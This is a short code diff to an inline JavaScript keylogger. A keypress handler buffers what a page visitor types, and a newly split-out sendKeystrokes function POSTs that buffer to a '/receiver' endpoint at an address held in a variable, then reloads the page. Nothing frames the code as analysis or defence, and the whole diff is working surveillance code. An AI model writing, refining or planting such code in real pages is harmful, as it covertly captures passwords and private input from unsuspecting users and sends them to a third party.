@@ -15,6 +15,11 @@ document.onkeypress = function(e) {
 }
 
 function doWork() {
+    sendKeystrokes();
+    window.location.reload();
+}
+
+function sendKeystrokes() {
     var xhr = new XMLHttpRequest();
     var poststr = user+'/receiver'
     xhr.open("POST", poststr, true);
@@ -24,7 +29,7 @@ function doWork() {
     }));
     buffer = [];
     // window.location.reload();
-    setTimeout(function() { window.location.reload(); }, 5000);
+    // setTimeout(function() { window.location.reload(); }, 5000);
 }
 
 </script>
